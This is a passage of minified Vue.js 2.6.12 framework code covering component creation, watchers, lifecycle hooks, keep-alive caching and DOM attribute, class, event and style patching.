t,n=e.context,r=e.componentInstance;r._isMounted||(r._isMounted=!0,Xt(r,"mounted")),e.data.keepAlive&&(n._isMounted?((t=r)._inactive=!1,tn.push(t)):Yt(r,!0))},destroy:function(e){var t=e.componentInstance;t._isDestroyed||(e.data.keepAlive?function e(t,n){if(n&&(t._directInactive=!0,Zt(t)))return;if(!t._inactive){t._inactive=!0;for(var r=0;r<t.$children.length;r++)e(t.$children[r]);Xt(t,"deactivated")}}(t,!0):t.$destroy())}},Dt=Object.keys(Rt);function Nt(e,t,n,s,c){if(!a(e)){var u=n.$options._base;if(l(e)&&(e=u.extend(e)),"function"==typeof e){var p;if(a(e.cid)&&void 0===(e=function(e,t){if(i(e.error)&&o(e.errorComp))return e.errorComp;if(o(e.resolved))return e.resolved;var n=Bt;n&&o(e.owners)&&-1===e.owners.indexOf(n)&&e.owners.push(n);if(i(e.loading)&&o(e.loadingComp))return e.loadingComp;if(n&&!o(e.owners)){var r=e.owners=[n],s=!0,c=null,u=null;n.$on("hook:destroyed",(function(){return b(r,n)}));var p=function(e){for(var t=0,n=r.length;t<n;t++)r[t].$forceUpdate();e&&(r.length=0,null!==c&&(clearTimeout(c),c=null),null!==u&&(clearTimeout(u),u=null))},d=D((function(n){e.resolved=Ht(n,t),s?r.length=0:p(!0)})),h=D((function(t){o(e.errorComp)&&(e.error=!0,p(!0))})),f=e(d,h);return l(f)&&(g(f)?a(e.resolved)&&f.then(d,h):g(f.component)&&(f.component.then(d,h),o(f.error)&&(e.errorComp=Ht(f.error,t)),o(f.loading)&&(e.loadingComp=Ht(f.loading,t),0===f.delay?e.loading=!0:c=setTimeout((function(){c=null,a(e.resolved)&&a(e.error)&&(e.loading=!0,p(!1))}),f.delay||200)),o(f.timeout)&&(u=setTimeout((function(){u=null,a(e.resolved)&&h(null)}),f.timeout)))),s=!1,e.loading?e.loadingComp:e.resolved}}(p=e,u)))return function(e,t,n,r,a){var o=me();return o.asyncFactory=e,o.asyncMeta={data:t,context:n,children:r,tag:a},o}(p,t,n,s,c);t=t||{},wn(e),o(t.model)&&function(e,t){var n=e.model&&e.model.prop||"value",r=e.model&&e.model.event||"input";(t.attrs||(t.attrs={}))[n]=t.model.value;var a=t.on||(t.on={}),i=a[r],s=t.model.callback;o(i)?(Array.isArray(i)?-1===i.indexOf(s):i!==s)&&(a[r]=[s].concat(i)):a[r]=s}(e.options,t);var d=function(e,t,n){var r=t.options.props;if(!a(r)){var i={},s=e.attrs,l=e.props;if(o(s)||o(l))for(var c in r){var u=j(c);lt(i,l,c,u,!0)||lt(i,s,c,u,!1)}return i}}(t,e);if(i(e.options.functional))return function(e,t,n,a,i){var s=e.options,l={},c=s.props;if(o(c))for(var u in c)l[u]=$e(u,c,t||r);else o(n.attrs)&&Mt(l,n.attrs),o(n.props)&&Mt(l,n.props);var p=new It(n,l,i,a,e),d=s.render.call(null,p._c,p);if(d instanceof he)return Lt(d,n,p.parent,s,p);if(Array.isArray(d)){for(var g=ct(d)||[],h=new Array(g.length),f=0;f<g.length;f++)h[f]=Lt(g[f],n,p.parent,s,p);return h}}(e,d,t,n,s);var h=t.on;if(t.on=t.nativeOn,i(e.options.abstract)){var f=t.slot;t={},f&&(t.slot=f)}!function(e){for(var t=e.hook||(e.hook={}),n=0;n<Dt.length;n++){var r=Dt[n],a=t[r],o=Rt[r];a===o||a&&a._merged||(t[r]=a?$t(o,a):o)}}(t);var m=e.options.name||c;return new he("vue-component-"+e.cid+(m?"-"+m:""),t,void 0,void 0,void 0,n,{Ctor:e,propsData:d,listeners:h,tag:c,children:s},p)}}}function $t(e,t){var n=function(n,r){e(n,r),t(n,r)};return n._merged=!0,n}function Ft(e,t,n,r,c,u){return(Array.isArray(n)||s(n))&&(c=r,r=n,n=void 0),i(u)&&(c=2),function(e,t,n,r,s){if(o(n)&&o(n.__ob__))return me();o(n)&&o(n.is)&&(t=n.is);if(!t)return me();0;Array.isArray(r)&&"function"==typeof r[0]&&((n=n||{}).scopedSlots={default:r[0]},r.length=0);2===s?r=ct(r):1===s&&(r=function(e){for(var t=0;t<e.length;t++)if(Array.isArray(e[t]))return Array.prototype.concat.apply([],e);return e}(r));var c,u;if("string"==typeof t){var p;u=e.$vnode&&e.$vnode.ns||F.getTagNamespace(t),c=F.isReservedTag(t)?new he(F.parsePlatformTagName(t),n,r,void 0,void 0,e):n&&n.pre||!o(p=Ne(e.$options,"components",t))?new he(t,n,r,void 0,void 0,e):Nt(p,n,e,r,t)}else c=Nt(t,n,e,r);return Array.isArray(c)?c:o(c)?(o(u)&&function e(t,n,r){t.ns=n,"foreignObject"===t.tag&&(n=void 0,r=!0);if(o(t.children))for(var s=0,l=t.children.length;s<l;s++){var c=t.children[s];o(c.tag)&&(a(c.ns)||i(r)&&"svg"!==c.tag)&&e(c,n,r)}}(c,u),o(n)&&function(e){l(e.style)&&rt(e.style);l(e.class)&&rt(e.class)}(n),c):me()}(e,t,n,r,c)}var Ut,Bt=null;function Ht(e,t){return(e.__esModule||se&&"Module"===e[Symbol.toStringTag])&&(e=e.default),l(e)?t.extend(e):e}function qt(e){return e.isComment&&e.asyncFactory}function zt(e){if(Array.isArray(e))for(var t=0;t<e.length;t++){var n=e[t];if(o(n)&&(o(n.componentOptions)||qt(n)))return n}}function Jt(e,t){Ut.$on(e,t)}function Vt(e,t){Ut.$off(e,t)}function Wt(e,t){var n=Ut;return function r(){var a=t.apply(null,arguments);null!==a&&n.$off(e,r)}}function Kt(e,t,n){Ut=e,it(t,n||{},Jt,Vt,Wt,e),Ut=void 0}var Gt=null;function Qt(e){var t=Gt;return Gt=e,function(){Gt=t}}function Zt(e){for(;e&&(e=e.$parent);)if(e._inactive)return!0;return!1}function Yt(e,t){if(t){if(e._directInactive=!1,Zt(e))return}else if(e._directInactive)return;if(e._inactive||null===e._inactive){e._inactive=!1;for(var n=0;n<e.$children.length;n++)Yt(e.$children[n]);Xt(e,"activated")}}function Xt(e,t){de();var n=e.$options[t],r=t+" hook";if(n)for(var a=0,o=n.length;a<o;a++)qe(n[a],e,null,e,r);e._hasHookEvent&&e.$emit("hook:"+t),ge()}var en=[],tn=[],nn={},rn=!1,an=!1,on=0;var sn=0,ln=Date.now;if(J&&!G){var cn=window.performance;cn&&"function"==typeof cn.now&&ln()>document.createEvent("Event").timeStamp&&(ln=function(){return cn.now()})}function un(){var e,t;for(sn=ln(),an=!0,en.sort((function(e,t){return e.id-t.id})),on=0;on<en.length;on++)(e=en[on]).before&&e.before(),t=e.id,nn[t]=null,e.run();var n=tn.slice(),r=en.slice();on=en.length=tn.length=0,nn={},rn=an=!1,function(e){for(var t=0;t<e.length;t++)e[t]._inactive=!0,Yt(e[t],!0)}(n),function(e){var t=e.length;for(;t--;){var n=e[t],r=n.vm;r._watcher===n&&r._isMounted&&!r._isDestroyed&&Xt(r,"updated")}}(r),ae&&F.devtools&&ae.emit("flush")}var pn=0,dn=function(e,t,n,r,a){this.vm=e,a&&(e._watcher=this),e._watchers.push(this),r?(this.deep=!!r.deep,this.user=!!r.user,this.lazy=!!r.lazy,this.sync=!!r.sync,this.before=r.before):this.deep=this.user=this.lazy=this.sync=!1,this.cb=n,this.id=++pn,this.active=!0,this.dirty=this.lazy,this.deps=[],this.newDeps=[],this.depIds=new ie,this.newDepIds=new ie,this.expression="","function"==typeof t?this.getter=t:(this.getter=function(e){if(!H.test(e)){var t=e.split(".");return function(e){for(var n=0;n<t.length;n++){if(!e)return;e=e[t[n]]}return e}}}(t),this.getter||(this.getter=O)),this.value=this.lazy?void 0:this.get()};dn.prototype.get=function(){var e;de(this);var t=this.vm;try{e=this.getter.call(t,t)}catch(e){if(!this.user)throw e;He(e,t,'getter for watcher "'+this.expression+'"')}finally{this.deep&&rt(e),ge(),this.cleanupDeps()}return e},dn.prototype.addDep=function(e){var t=e.id;this.newDepIds.has(t)||(this.newDepIds.add(t),this.newDeps.push(e),this.depIds.has(t)||e.addSub(this))},dn.prototype.cleanupDeps=function(){for(var e=this.deps.length;e--;){var t=this.deps[e];this.newDepIds.has(t.id)||t.removeSub(this)}var n=this.depIds;this.depIds=this.newDepIds,this.newDepIds=n,this.newDepIds.clear(),n=this.deps,this.deps=this.newDeps,this.newDeps=n,this.newDeps.length=0},dn.prototype.update=function(){this.lazy?this.dirty=!0:this.sync?this.run():function(e){var t=e.id;if(null==nn[t]){if(nn[t]=!0,an){for(var n=en.length-1;n>on&&en[n].id>e.id;)n--;en.splice(n+1,0,e)}else en.push(e);rn||(rn=!0,tt(un))}}(this)},dn.prototype.run=function(){if(this.active){var e=this.get();if(e!==this.value||l(e)||this.deep){var t=this.value;if(this.value=e,this.user)try{this.cb.call(this.vm,e,t)}catch(e){He(e,this.vm,'callback for watcher "'+this.expression+'"')}else this.cb.call(this.vm,e,t)}}},dn.prototype.evaluate=function(){this.value=this.get(),this.dirty=!1},dn.prototype.depend=function(){for(var e=this.deps.length;e--;)this.deps[e].depend()},dn.prototype.teardown=function(){if(this.active){this.vm._isBeingDestroyed||b(this.vm._watchers,this);for(var e=this.deps.length;e--;)this.deps[e].removeSub(this);this.active=!1}};var gn={enumerable:!0,configurable:!0,get:O,set:O};function hn(e,t,n){gn.get=function(){return this[t][n]},gn.set=function(e){this[t][n]=e},Object.defineProperty(e,n,gn)}function fn(e){e._watchers=[];var t=e.$options;t.props&&function(e,t){var n=e.$options.propsData||{},r=e._props={},a=e.$options._propKeys=[];e.$parent&&Se(!1);var o=function(o){a.push(o);var i=$e(o,t,n,e);je(r,o,i),o in e||hn(e,"_props",o)};for(var i in t)o(i);Se(!0)}(e,t.props),t.methods&&function(e,t){e.$options.props;for(var n in t)e[n]="function"!=typeof t[n]?O:P(t[n],e)}(e,t.methods),t.data?function(e){var t=e.$options.data;u(t=e._data="function"==typeof t?function(e,t){de();try{return e.call(t,t)}catch(e){return He(e,t,"data()"),{}}finally{ge()}}(t,e):t||{})||(t={});var n=Object.keys(t),r=e.$options.props,a=(e.$options.methods,n.length);for(;a--;){var o=n[a];0,r&&x(r,o)||(i=void 0,36!==(i=(o+"").charCodeAt(0))&&95!==i&&hn(e,"_data",o))}var i;Te(t,!0)}(e):Te(e._data={},!0),t.computed&&function(e,t){var n=e._computedWatchers=Object.create(null),r=re();for(var a in t){var o=t[a],i="function"==typeof o?o:o.get;0,r||(n[a]=new dn(e,i||O,O,mn)),a in e||vn(e,a,o)}}(e,t.computed),t.watch&&t.watch!==ee&&function(e,t){for(var n in t){var r=t[n];if(Array.isArray(r))for(var a=0;a<r.length;a++)xn(e,n,r[a]);else xn(e,n,r)}}(e,t.watch)}var mn={lazy:!0};function vn(e,t,n){var r=!re();"function"==typeof n?(gn.get=r?bn(t):yn(n),gn.set=O):(gn.get=n.get?r&&!1!==n.cache?bn(t):yn(n.get):O,gn.set=n.set||O),Object.defineProperty(e,t,gn)}function bn(e){return function(){var t=this._computedWatchers&&this._computedWatchers[e];if(t)return t.dirty&&t.evaluate(),ue.target&&t.depend(),t.value}}function yn(e){return function(){return e.call(this,this)}}function xn(e,t,n,r){return u(n)&&(r=n,n=n.handler),"string"==typeof n&&(n=e[n]),e.$watch(t,n,r)}var kn=0;function wn(e){var t=e.options;if(e.super){var n=wn(e.super);if(n!==e.superOptions){e.superOptions=n;var r=function(e){var t,n=e.options,r=e.sealedOptions;for(var a in n)n[a]!==r[a]&&(t||(t={}),t[a]=n[a]);return t}(e);r&&E(e.extendOptions,r),(t=e.options=De(n,e.extendOptions)).name&&(t.components[t.name]=e)}}return t}function Sn(e){this._init(e)}function _n(e){e.cid=0;var t=1;e.extend=function(e){e=e||{};var n=this,r=n.cid,a=e._Ctor||(e._Ctor={});if(a[r])return a[r];var o=e.name||n.options.name;var i=function(e){this._init(e)};return(i.prototype=Object.create(n.prototype)).constructor=i,i.cid=t++,i.options=De(n.options,e),i.super=n,i.options.props&&function(e){var t=e.options.props;for(var n in t)hn(e.prototype,"_props",n)}(i),i.options.computed&&function(e){var t=e.options.computed;for(var n in t)vn(e.prototype,n,t[n])}(i),i.extend=n.extend,i.mixin=n.mixin,i.use=n.use,N.forEach((function(e){i[e]=n[e]})),o&&(i.options.components[o]=i),i.superOptions=n.options,i.extendOptions=e,i.sealedOptions=E({},i.options),a[r]=i,i}}function Tn(e){return e&&(e.Ctor.options.name||e.tag)}function jn(e,t){return Array.isArray(e)?e.indexOf(t)>-1:"string"==typeof e?e.split(",").indexOf(t)>-1:!!p(e)&&e.test(t)}function Pn(e,t){var n=e.cache,r=e.keys,a=e._vnode;for(var o in n){var i=n[o];if(i){var s=Tn(i.componentOptions);s&&!t(s)&&Cn(n,o,r,a)}}}function Cn(e,t,n,r){var a=e[t];!a||r&&a.tag===r.tag||a.componentInstance.$destroy(),e[t]=null,b(n,t)}!function(e){e.prototype._init=function(e){var t=this;t._uid=kn++,t._isVue=!0,e&&e._isComponent?function(e,t){var n=e.$options=Object.create(e.constructor.options),r=t._parentVnode;n.parent=t.parent,n._parentVnode=r;var a=r.componentOptions;n.propsData=a.propsData,n._parentListeners=a.listeners,n._renderChildren=a.children,n._componentTag=a.tag,t.render&&(n.render=t.render,n.staticRenderFns=t.staticRenderFns)}(t,e):t.$options=De(wn(t.constructor),e||{},t),t._renderProxy=t,t._self=t,function(e){var t=e.$options,n=t.parent;if(n&&!t.abstract){for(;n.$options.abstract&&n.$parent;)n=n.$parent;n.$children.push(e)}e.$parent=n,e.$root=n?n.$root:e,e.$children=[],e.$refs={},e._watcher=null,e._inactive=null,e._directInactive=!1,e._isMounted=!1,e._isDestroyed=!1,e._isBeingDestroyed=!1}(t),function(e){e._events=Object.create(null),e._hasHookEvent=!1;var t=e.$options._parentListeners;t&&Kt(e,t)}(t),function(e){e._vnode=null,e._staticTrees=null;var t=e.$options,n=e.$vnode=t._parentVnode,a=n&&n.context;e.$slots=dt(t._renderChildren,a),e.$scopedSlots=r,e._c=function(t,n,r,a){return Ft(e,t,n,r,a,!1)},e.$createElement=function(t,n,r,a){return Ft(e,t,n,r,a,!0)};var o=n&&n.data;je(e,"$attrs",o&&o.attrs||r,null,!0),je(e,"$listeners",t._parentListeners||r,null,!0)}(t),Xt(t,"beforeCreate"),function(e){var t=pt(e.$options.inject,e);t&&(Se(!1),Object.keys(t).forEach((function(n){je(e,n,t[n])})),Se(!0))}(t),fn(t),function(e){var t=e.$options.provide;t&&(e._provided="function"==typeof t?t.call(e):t)}(t),Xt(t,"created"),t.$options.el&&t.$mount(t.$options.el)}}(Sn),function(e){var t={get:function(){return this._data}},n={get:function(){return this._props}};Object.defineProperty(e.prototype,"$data",t),Object.defineProperty(e.prototype,"$props",n),e.prototype.$set=Pe,e.prototype.$delete=Ce,e.prototype.$watch=function(e,t,n){if(u(t))return xn(this,e,t,n);(n=n||{}).user=!0;var r=new dn(this,e,t,n);if(n.immediate)try{t.call(this,r.value)}catch(e){He(e,this,'callback for immediate watcher "'+r.expression+'"')}return function(){r.teardown()}}}(Sn),function(e){var t=/^hook:/;e.prototype.$on=function(e,n){var r=this;if(Array.isArray(e))for(var a=0,o=e.length;a<o;a++)r.$on(e[a],n);else(r._events[e]||(r._events[e]=[])).push(n),t.test(e)&&(r._hasHookEvent=!0);return r},e.prototype.$once=function(e,t){var n=this;function r(){n.$off(e,r),t.apply(n,arguments)}return r.fn=t,n.$on(e,r),n},e.prototype.$off=function(e,t){var n=this;if(!arguments.length)return n._events=Object.create(null),n;if(Array.isArray(e)){for(var r=0,a=e.length;r<a;r++)n.$off(e[r],t);return n}var o,i=n._events[e];if(!i)return n;if(!t)return n._events[e]=null,n;for(var s=i.length;s--;)if((o=i[s])===t||o.fn===t){i.splice(s,1);break}return n},e.prototype.$emit=function(e){var t=this,n=t._events[e];if(n){n=n.length>1?C(n):n;for(var r=C(arguments,1),a='event handler for "'+e+'"',o=0,i=n.length;o<i;o++)qe(n[o],t,r,t,a)}return t}}(Sn),function(e){e.prototype._update=function(e,t){var n=this,r=n.$el,a=n._vnode,o=Qt(n);n._vnode=e,n.$el=a?n.__patch__(a,e):n.__patch__(n.$el,e,t,!1),o(),r&&(r.__vue__=null),n.$el&&(n.$el.__vue__=n),n.$vnode&&n.$parent&&n.$vnode===n.$parent._vnode&&(n.$parent.$el=n.$el)},e.prototype.$forceUpdate=function(){this._watcher&&this._watcher.update()},e.prototype.$destroy=function(){var e=this;if(!e._isBeingDestroyed){Xt(e,"beforeDestroy"),e._isBeingDestroyed=!0;var t=e.$parent;!t||t._isBeingDestroyed||e.$options.abstract||b(t.$children,e),e._watcher&&e._watcher.teardown();for(var n=e._watchers.length;n--;)e._watchers[n].teardown();e._data.__ob__&&e._data.__ob__.vmCount--,e._isDestroyed=!0,e.__patch__(e._vnode,null),Xt(e,"destroyed"),e.$off(),e.$el&&(e.$el.__vue__=null),e.$vnode&&(e.$vnode.parent=null)}}}(Sn),function(e){Ot(e.prototype),e.prototype.$nextTick=function(e){return tt(e,this)},e.prototype._render=function(){var e,t=this,n=t.$options,r=n.render,a=n._parentVnode;a&&(t.$scopedSlots=ht(a.data.scopedSlots,t.$slots,t.$scopedSlots)),t.$vnode=a;try{Bt=t,e=r.call(t._renderProxy,t.$createElement)}catch(n){He(n,t,"render"),e=t._vnode}finally{Bt=null}return Array.isArray(e)&&1===e.length&&(e=e[0]),e instanceof he||(e=me()),e.parent=a,e}}(Sn);var En=[String,RegExp,Array],An={KeepAlive:{name:"keep-alive",abstract:!0,props:{include:En,exclude:En,max:[String,Number]},created:function(){this.cache=Object.create(null),this.keys=[]},destroyed:function(){for(var e in this.cache)Cn(this.cache,e,this.keys)},mounted:function(){var e=this;this.$watch("include",(function(t){Pn(e,(function(e){return jn(t,e)}))})),this.$watch("exclude",(function(t){Pn(e,(function(e){return!jn(t,e)}))}))},render:function(){var e=this.$slots.default,t=zt(e),n=t&&t.componentOptions;if(n){var r=Tn(n),a=this.include,o=this.exclude;if(a&&(!r||!jn(a,r))||o&&r&&jn(o,r))return t;var i=this.cache,s=this.keys,l=null==t.key?n.Ctor.cid+(n.tag?"::"+n.tag:""):t.key;i[l]?(t.componentInstance=i[l].componentInstance,b(s,l),s.push(l)):(i[l]=t,s.push(l),this.max&&s.length>parseInt(this.max)&&Cn(i,s[0],s,this._vnode)),t.data.keepAlive=!0}return t||e&&e[0]}}};!function(e){var t={get:function(){return F}};Object.defineProperty(e,"config",t),e.util={warn:le,extend:E,mergeOptions:De,defineReactive:je},e.set=Pe,e.delete=Ce,e.nextTick=tt,e.observable=function(e){return Te(e),e},e.options=Object.create(null),N.forEach((function(t){e.options[t+"s"]=Object.create(null)})),e.options._base=e,E(e.options.components,An),function(e){e.use=function(e){var t=this._installedPlugins||(this._installedPlugins=[]);if(t.indexOf(e)>-1)return this;var n=C(arguments,1);return n.unshift(this),"function"==typeof e.install?e.install.apply(e,n):"function"==typeof e&&e.apply(null,n),t.push(e),this}}(e),function(e){e.mixin=function(e){return this.options=De(this.options,e),this}}(e),_n(e),function(e){N.forEach((function(t){e[t]=function(e,n){return n?("component"===t&&u(n)&&(n.name=n.name||e,n=this.options._base.extend(n)),"directive"===t&&"function"==typeof n&&(n={bind:n,update:n}),this.options[t+"s"][e]=n,n):this.options[t+"s"][e]}}))}(e)}(Sn),Object.defineProperty(Sn.prototype,"$isServer",{get:re}),Object.defineProperty(Sn.prototype,"$ssrContext",{get:function(){return this.$vnode&&this.$vnode.ssrContext}}),Object.defineProperty(Sn,"FunctionalRenderContext",{value:It}),Sn.version="2.6.12";var On=m("style,class"),In=m("input,textarea,option,select,progress"),Ln=m("contenteditable,draggable,spellcheck"),Mn=m("events,caret,typing,plaintext-only"),Rn=m("allowfullscreen,async,autofocus,autoplay,checked,compact,controls,declare,default,defaultchecked,defaultmuted,defaultselected,defer,disabled,enabled,formnovalidate,hidden,indeterminate,inert,ismap,itemscope,loop,multiple,muted,nohref,noresize,noshade,novalidate,nowrap,open,pauseonexit,readonly,required,reversed,scoped,seamless,selected,sortable,translate,truespeed,typemustmatch,visible"),Dn="http://www.w3.org/1999/xlink",Nn=function(e){return":"===e.charAt(5)&&"xlink"===e.slice(0,5)},$n=function(e){return Nn(e)?e.slice(6,e.length):""},Fn=function(e){return null==e||!1===e};function Un(e){for(var t=e.data,n=e,r=e;o(r.componentInstance);)(r=r.componentInstance._vnode)&&r.data&&(t=Bn(r.data,t));for(;o(n=n.parent);)n&&n.data&&(t=Bn(t,n.data));return function(e,t){if(o(e)||o(t))return Hn(e,qn(t));return""}(t.staticClass,t.class)}function Bn(e,t){return{staticClass:Hn(e.staticClass,t.staticClass),class:o(e.class)?[e.class,t.class]:t.class}}function Hn(e,t){return e?t?e+" "+t:e:t||""}function qn(e){return Array.isArray(e)?function(e){for(var t,n="",r=0,a=e.length;r<a;r++)o(t=qn(e[r]))&&""!==t&&(n&&(n+=" "),n+=t);return n}(e):l(e)?function(e){var t="";for(var n in e)e[n]&&(t&&(t+=" "),t+=n);return t}(e):"string"==typeof e?e:""}var zn={svg:"http://www.w3.org/2000/svg",math:"http://www.w3.org/1998/Math/MathML"},Jn=m("html,body,base,head,link,meta,style,title,address,article,aside,footer,header,h1,h2,h3,h4,h5,h6,hgroup,nav,section,div,dd,dl,dt,figcaption,figure,picture,hr,img,li,main,ol,p,pre,ul,a,b,abbr,bdi,bdo,br,cite,code,data,dfn,em,i,kbd,mark,q,rp,rt,rtc,ruby,s,samp,small,span,strong,sub,sup,time,u,var,wbr,area,audio,map,track,video,embed,object,param,source,canvas,script,noscript,del,ins,caption,col,colgroup,table,thead,tbody,td,th,tr,button,datalist,fieldset,form,input,label,legend,meter,optgroup,option,output,progress,select,textarea,details,dialog,menu,menuitem,summary,content,element,shadow,template,blockquote,iframe,tfoot"),Vn=m("svg,animate,circle,clippath,cursor,defs,desc,ellipse,filter,font-face,foreignObject,g,glyph,image,line,marker,mask,missing-glyph,path,pattern,polygon,polyline,rect,switch,symbol,text,textpath,tspan,use,view",!0),Wn=function(e){return Jn(e)||Vn(e)};var Kn=Object.create(null);var Gn=m("text,number,password,search,email,tel,url");var Qn=Object.freeze({createElement:function(e,t){var n=document.createElement(e);return"select"!==e||t.data&&t.data.attrs&&void 0!==t.data.attrs.multiple&&n.setAttribute("multiple","multiple"),n},createElementNS:function(e,t){return document.createElementNS(zn[e],t)},createTextNode:function(e){return document.createTextNode(e)},createComment:function(e){return document.createComment(e)},insertBefore:function(e,t,n){e.insertBefore(t,n)},removeChild:function(e,t){e.removeChild(t)},appendChild:function(e,t){e.appendChild(t)},parentNode:function(e){return e.parentNode},nextSibling:function(e){return e.nextSibling},tagName:function(e){return e.tagName},setTextContent:function(e,t){e.textContent=t},setStyleScope:function(e,t){e.setAttribute(t,"")}}),Zn={create:function(e,t){Yn(t)},update:function(e,t){e.data.ref!==t.data.ref&&(Yn(e,!0),Yn(t))},destroy:function(e){Yn(e,!0)}};function Yn(e,t){var n=e.data.ref;if(o(n)){var r=e.context,a=e.componentInstance||e.elm,i=r.$refs;t?Array.isArray(i[n])?b(i[n],a):i[n]===a&&(i[n]=void 0):e.data.refInFor?Array.isArray(i[n])?i[n].indexOf(a)<0&&i[n].push(a):i[n]=[a]:i[n]=a}}var Xn=new he("",{},[]),er=["create","activate","update","remove","destroy"];function tr(e,t){return e.key===t.key&&(e.tag===t.tag&&e.isComment===t.isComment&&o(e.data)===o(t.data)&&function(e,t){if("input"!==e.tag)return!0;var n,r=o(n=e.data)&&o(n=n.attrs)&&n.type,a=o(n=t.data)&&o(n=n.attrs)&&n.type;return r===a||Gn(r)&&Gn(a)}(e,t)||i(e.isAsyncPlaceholder)&&e.asyncFactory===t.asyncFactory&&a(t.asyncFactory.error))}function nr(e,t,n){var r,a,i={};for(r=t;r<=n;++r)o(a=e[r].key)&&(i[a]=r);return i}var rr={create:ar,update:ar,destroy:function(e){ar(e,Xn)}};function ar(e,t){(e.data.directives||t.data.directives)&&function(e,t){var n,r,a,o=e===Xn,i=t===Xn,s=ir(e.data.directives,e.context),l=ir(t.data.directives,t.context),c=[],u=[];for(n in l)r=s[n],a=l[n],r?(a.oldValue=r.value,a.oldArg=r.arg,lr(a,"update",t,e),a.def&&a.def.componentUpdated&&u.push(a)):(lr(a,"bind",t,e),a.def&&a.def.inserted&&c.push(a));if(c.length){var p=function(){for(var n=0;n<c.length;n++)lr(c[n],"inserted",t,e)};o?st(t,"insert",p):p()}u.length&&st(t,"postpatch",(function(){for(var n=0;n<u.length;n++)lr(u[n],"componentUpdated",t,e)}));if(!o)for(n in s)l[n]||lr(s[n],"unbind",e,e,i)}(e,t)}var or=Object.create(null);function ir(e,t){var n,r,a=Object.create(null);if(!e)return a;for(n=0;n<e.length;n++)(r=e[n]).modifiers||(r.modifiers=or),a[sr(r)]=r,r.def=Ne(t.$options,"directives",r.name);return a}function sr(e){return e.rawName||e.name+"."+Object.keys(e.modifiers||{}).join(".")}function lr(e,t,n,r,a){var o=e.def&&e.def[t];if(o)try{o(n.elm,e,n,r,a)}catch(r){He(r,n.context,"directive "+e.name+" "+t+" hook")}}var cr=[Zn,rr];function ur(e,t){var n=t.componentOptions;if(!(o(n)&&!1===n.Ctor.options.inheritAttrs||a(e.data.attrs)&&a(t.data.attrs))){var r,i,s=t.elm,l=e.data.attrs||{},c=t.data.attrs||{};for(r in o(c.__ob__)&&(c=t.data.attrs=E({},c)),c)i=c[r],l[r]!==i&&pr(s,r,i);for(r in(G||Z)&&c.value!==l.value&&pr(s,"value",c.value),l)a(c[r])&&(Nn(r)?s.removeAttributeNS(Dn,$n(r)):Ln(r)||s.removeAttribute(r))}}function pr(e,t,n){e.tagName.indexOf("-")>-1?dr(e,t,n):Rn(t)?Fn(n)?e.removeAttribute(t):(n="allowfullscreen"===t&&"EMBED"===e.tagName?"true":t,e.setAttribute(t,n)):Ln(t)?e.setAttribute(t,function(e,t){return Fn(t)||"false"===t?"false":"contenteditable"===e&&Mn(t)?t:"true"}(t,n)):Nn(t)?Fn(n)?e.removeAttributeNS(Dn,$n(t)):e.setAttributeNS(Dn,t,n):dr(e,t,n)}function dr(e,t,n){if(Fn(n))e.removeAttribute(t);else{if(G&&!Q&&"TEXTAREA"===e.tagName&&"placeholder"===t&&""!==n&&!e.__ieph){var r=function(t){t.stopImmediatePropagation(),e.removeEventListener("input",r)};e.addEventListener("input",r),e.__ieph=!0}e.setAttribute(t,n)}}var gr={create:ur,update:ur};function hr(e,t){var n=t.elm,r=t.data,i=e.data;if(!(a(r.staticClass)&&a(r.class)&&(a(i)||a(i.staticClass)&&a(i.class)))){var s=Un(t),l=n._transitionClasses;o(l)&&(s=Hn(s,qn(l))),s!==n._prevClass&&(n.setAttribute("class",s),n._prevClass=s)}}var fr,mr={create:hr,update:hr};function vr(e,t,n){var r=fr;return function a(){var o=t.apply(null,arguments);null!==o&&xr(e,a,n,r)}}var br=We&&!(X&&Number(X[1])<=53);function yr(e,t,n,r){if(br){var a=sn,o=t;t=o._wrapper=function(e){if(e.target===e.currentTarget||e.timeStamp>=a||e.timeStamp<=0||e.target.ownerDocument!==document)return o.apply(this,arguments)}}fr.addEventListener(e,t,te?{capture:n,passive:r}:n)}function xr(e,t,n,r){(r||fr).removeEventListener(e,t._wrapper||t,n)}function kr(e,t){if(!a(e.data.on)||!a(t.data.on)){var n=t.data.on||{},r=e.data.on||{};fr=t.elm,function(e){if(o(e.__r)){var t=G?"change":"input";e[t]=[].concat(e.__r,e[t]||[]),delete e.__r}o(e.__c)&&(e.change=[].concat(e.__c,e.change||[]),delete e.__c)}(n),it(n,r,yr,xr,vr,t.context),fr=void 0}}var wr,Sr={create:kr,update:kr};function _r(e,t){if(!a(e.data.domProps)||!a(t.data.domProps)){var n,r,i=t.elm,s=e.data.domProps||{},l=t.data.domProps||{};for(n in o(l.__ob__)&&(l=t.data.domProps=E({},l)),s)n in l||(i[n]="");for(n in l){if(r=l[n],"textContent"===n||"innerHTML"===n){if(t.children&&(t.children.length=0),r===s[n])continue;1===i.childNodes.length&&i.removeChild(i.childNodes[0])}if("value"===n&&"PROGRESS"!==i.tagName){i._value=r;var c=a(r)?"":String(r);Tr(i,c)&&(i.value=c)}else if("innerHTML"===n&&Vn(i.tagName)&&a(i.innerHTML)){(wr=wr||document.createElement("div")).innerHTML="<svg>"+r+"</svg>";for(var u=wr.firstChild;i.firstChild;)i.removeChild(i.firstChild);for(;u.firstChild;)i.appendChild(u.firstChild)}else if(r!==s[n])try{i[n]=r}catch(e){}}}}function Tr(e,t){return!e.composing&&("OPTION"===e.tagName||function(e,t){var n=!0;try{n=document.activeElement!==e}catch(e){}return n&&e.value!==t}(e,t)||function(e,t){var n=e.value,r=e._vModifiers;if(o(r)){if(r.number)return f(n)!==f(t);if(r.trim)return n.trim()!==t.trim()}return n!==t}(e,t))}var jr={create:_r,update:_r},Pr=k((function(e){var t={},n=/:(.+)/;return e.split(/;(?![^(]*\))/g).forEach((function(e){if(e){var r=e.split(n);r.length>1&&(t[r[0].trim()]=r[1].trim())}})),t}));function Cr(e){var t=Er(e.style);return e.staticStyle?E(e.staticStyle,t):t}function Er(e){return Array.isArray(e)?A(e):"string"==typeof e?Pr(e):e}var Ar,Or=/^--/,Ir=/\s*!important$/,Lr=function(e,t,n){if(Or.test(t))e.style.setProperty(t,n);else if(Ir.test(n))e.style.setProperty(j(t),n.replace(Ir,""),"important");else{var r=Rr(t);if(Array.isArray(n))for(var a=0,o=n.length;a<o;a++)e.style[r]=n[a];else e.style[r]=n}},Mr=["Webkit","Moz","ms"],Rr=k((function(e){if(Ar=Ar||document.createElement("div").style,"filter"!==(e=S(e))&&e in Ar)return e;for(var t=e.charAt(0).toUpperCase()+e.slice(1),n=0;n<Mr.length;n++){var r=Mr[n]+t;if(r in Ar)return r}}));function Dr(e,t){var 